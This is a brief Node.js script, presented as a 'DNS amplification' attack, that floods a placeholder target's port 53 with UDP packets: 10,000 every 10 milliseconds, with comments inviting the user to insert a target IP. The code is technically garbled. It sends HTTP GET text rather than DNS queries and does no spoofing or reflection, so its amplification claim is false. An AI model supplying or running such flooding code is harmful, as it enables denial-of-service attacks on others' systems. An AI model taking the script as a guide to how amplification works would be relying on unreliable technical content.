const dgram = require('dgram');
const client = dgram.createSocket('udp4');

const target = 'example.com'; // Replace with target IP
const dnsPort = 53; // DNS Port
const dnsPayload = Buffer.from('DNS Amplification Payload Example'); // Custom DNS payload
const maxConnections = 10000; // Max simultaneous connections
const queryDomain = 'example.com'; // Custom domain for amplification query

function dnsAmplification() {
    for (let i = 0; i < maxConnections; i++) {
        const packet = Buffer.from(`GET /${queryDomain} HTTP/1.1\r\nHost: ${target}\r\n`);
        client.send(packet, 0, packet.length, dnsPort, target, (err) => {
            if (err) {
                console.error(`Error sending packet: ${err.message}`);
            } else {
                console.log(`[Packet ${i}] Sent DNS amplification packet to ${target}:${dnsPort}`);
            }
        });
    }
}

setInterval(dnsAmplification, 10); // Flood DNS server every 10ms